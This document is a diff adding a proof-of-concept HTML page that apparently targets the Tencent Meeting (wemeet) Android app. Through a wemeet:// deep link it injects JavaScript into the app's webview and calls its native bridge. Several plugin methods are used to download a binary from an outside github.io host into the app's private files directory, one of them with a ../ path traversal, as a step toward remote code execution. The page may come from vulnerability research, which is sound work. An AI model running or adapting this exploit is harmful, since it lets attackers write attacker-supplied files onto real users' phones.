@@ -1,0 +1,20 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P40</h1>
+<script>
+document.title='P40L-START';
+var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
+var bin='https://gitwhs.github.io/wm-poc-rce/p40.bin';
+var png='https://gitwhs.github.io/wm-poc-rce/p40.png';
+var js="javascript:(function(){document.title='P40INJ:'+location.host;window.__s=[];window.__p=function(r){try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}window.__s.push(String((r&&r.callId)||'?')+':'+(r&&r.code)+':'+String((r&&r.message)||'').slice(0,24));document.title='P40CB:'+window.__s.join('|')};function c(id,m,e,p){window.JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p',module:m,method:e,param:p||{},callId:id}))}c('E1','CommonPlugin','ExportFile',{url:'"+bin+"',fileName:'p40.bin',contentType:'application/octet-stream'});c('E2','CommonPlugin','ExportFile',{url:'"+bin+"',fileName:'..\/..\/..\/files\/p40t.bin',contentType:'application/octet-stream'});c('S1','CommonPlugin','SavePic',{url:'"+png+"',type:'url'});c('S2','CommonPlugin','SavePic',{url:'"+png+"',type:'png'});c('S3','CommonPlugin','SaveImage',{url:'"+png+"',type:'url'});c('I1','IdeaWebViewPlugin','DownloadIdeaFile',{url:'"+bin+"',idea_id:'1',content_type:'application/octet-stream',idea_title:'p40',meeting_code:'0'});c('T1','Storage','ExportFile',{url:'"+bin+"',fileName:'p40s.bin'});c('D1','CommonPlugin','DownloadFile',{url:'"+bin+"',fileName:'p40d.bin',save_path:'\/data\/user\/0\/com.tencent.wemeet.app\/files\/p40d.bin',dest_path:'\/data\/user\/0\/com.tencent.wemeet.app\/files\/p40d.bin',local_path:'\/data\/user\/0\/com.tencent.wemeet.app\/files\/p40d.bin'})})()";
+function frame(src, label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(official),'P40L-OFFICIAL'); }, 600);
+setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(js),'P40L-JSINJ'); }, 12000);
+setTimeout(function(){ document.title='P40L-DONE'; }, 28000);
+</script>
+</body></html>
